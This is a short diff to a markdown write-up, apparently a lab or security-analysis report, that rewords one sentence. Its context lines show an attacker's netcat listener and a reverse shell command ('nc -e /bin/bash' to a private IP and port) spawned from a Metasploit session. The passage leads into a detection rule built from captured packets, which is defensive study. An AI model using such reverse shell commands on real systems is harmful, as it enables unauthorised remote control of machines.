@@ -139,7 +139,7 @@ Note that once the vulnerability was exploited, the attacker ran ```whoami``` an
 ```nc -lvnp 17000 ```<br>
 This listened for connections on port 17000. Thereafter, in the Metasploit session which spawned the shell, the following was executed to send a shell to the attacker:<br>
 ```nc -e /bin/bash 192.168.8.134 17000```<br>
-Below are the commands used to listen for the reverse shell connection and some commands to setup better utility of the shell (a prompt, typical terminal output, tab completion and more):
+Below are the commands used to listen for the reverse shell connection and some commands to setup better utility of the shell (typical when improving the quality of the shell to allow easier use):
 <img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/attacker-reverse-shell.png?raw=true">
 
 The rule crafted from the packets captured was:<br>
